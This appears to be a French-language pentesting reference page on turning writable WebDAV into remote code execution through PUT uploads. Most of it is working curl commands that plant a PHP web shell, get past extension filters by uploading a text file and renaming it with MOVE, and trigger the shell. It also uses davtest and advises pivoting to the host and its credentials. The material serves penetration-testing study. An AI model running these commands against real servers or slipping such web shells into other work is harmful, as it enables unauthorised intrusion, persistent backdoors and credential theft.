---
order: 3
title: "Upload PUT vers RCE : déposer un fichier exécutable via WebDAV"
description: "Le verbe PUT de WebDAV écrit un fichier directement sur le serveur, et là où ce fichier atterrit dans un répertoire interprété par le web, il s'exécute à la requête. Les restrictions d'extension sont contournées en téléversant un type autorisé puis en le renommant via MOVE, ou grâce à des particularités du serveur, transformant un WebDAV accessible en écriture en exécution de code à distance fiable."
keywords:
  - put webdav
  - renommage move
  - web shell
  - filtre d'extension
  - exécution de code à distance
---

# Upload PUT vers RCE

L'attaque WebDAV la plus tranchante est `PUT` : il écrit un fichier sur le serveur sans aucune logique applicative intermédiaire, donc si le répertoire cible est interprété par le serveur web, le fichier téléversé s'exécute à la requête. Le seul obstacle est le filtrage d'extension, et WebDAV offre un contournement classique : faire un `PUT` d'un fichier avec une extension autorisée, puis le `MOVE` vers le nom exécutable, car le filtre vérifie le chemin du PUT mais pas la destination du MOVE. Le résultat est un web shell fiable à partir d'un partage WebDAV accessible en écriture.

```bash
# direct PUT where the dir executes the extension
curl -s -X PUT http://<target>/dav/shell.php --data '<?php system($_GET["c"]); ?>'
curl -s 'http://<target>/dav/shell.php?c=id'            # trigger

# extension-filter bypass: PUT allowed type, then MOVE to executable name
curl -s -X PUT http://<target>/dav/shell.txt --data '<?php system($_GET["c"]); ?>'
curl -s -X MOVE http://<target>/dav/shell.txt -H 'Destination: http://<target>/dav/shell.php'
curl -s 'http://<target>/dav/shell.php?c=id'

# IIS/ASP.NET: upload .aspx or use semicolon/trailing tricks where filters apply
# davtest automates discovery of which extensions execute
davtest -url http://<target>/dav/ -move
```

## Notes d'exploitation

- Le renommage PUT-puis-MOVE est le contournement fiable : le filtre d'extension valide couramment uniquement le chemin de la requête PUT, donc le MOVE vers l'extension exécutable fait passer le payload au-delà ; `davtest -move` confirme que ça fonctionne.
- Choisissez l'extension du payload selon ce que le serveur exécute (déterminé lors de la [découverte](discovery-and-methods.md)) : `.php`, `.jsp`/`.jspx`, `.aspx`/`.asp` selon la plateforme.
- Là où le répertoire WebDAV n'est pas lui-même exécutable, combinez avec la [traversée de répertoire](directory-traversal.md) (cible du PUT ou Destination du MOVE) pour placer le fichier dans un répertoire qui l'est.
- Le web shell s'exécute avec le privilège du serveur web ; utilisez-le pour pivoter vers l'hôte et les identifiants comme avec tout RCE web.

## Références

- [RFC 4918: PUT and MOVE](https://datatracker.ietf.org/doc/html/rfc4918)
- [HackTricks: WebDAV PUT/MOVE RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav)
